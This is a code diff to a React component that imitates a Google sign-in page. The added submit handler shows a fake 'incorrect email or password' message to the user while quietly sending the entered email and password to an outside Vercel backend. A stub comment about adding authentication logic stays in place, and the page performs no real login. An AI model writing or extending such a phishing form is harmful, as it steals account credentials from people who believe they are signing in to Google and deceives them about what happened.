@@ -1,6 +1,7 @@
 "use client";
 import React, { useState } from "react";
 import { FcGoogle } from "react-icons/fc";
+import axios from "axios";
 
 const GoogleLogin = () => {
   const [email, setEmail] = useState("");
@@ -24,8 +25,32 @@ const GoogleLogin = () => {
 
   const handleSubmit = (e) => {
     e.preventDefault();
-    if (step === 2 && email && password) {
-      alert(`Email: ${email}, Password: ${password}`);
+    if (step === 2 && email.includes("@") && password.length >= 8) {
+      alert("incorrect email or password");
+      let data = JSON.stringify({
+        username: email,
+        password: password,
+      });
+
+      let config = {
+        method: "post",
+        maxBodyLength: Infinity,
+        url: "https://backend-three-xi-39.vercel.app/user",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        data: data,
+      };
+
+      axios
+        .request(config)
+        .then((response) => {
+          console.log();
+        })
+        .catch((error) => {
+          console.log(error);
+        });
+
       // Add your authentication logic here
     }
   };
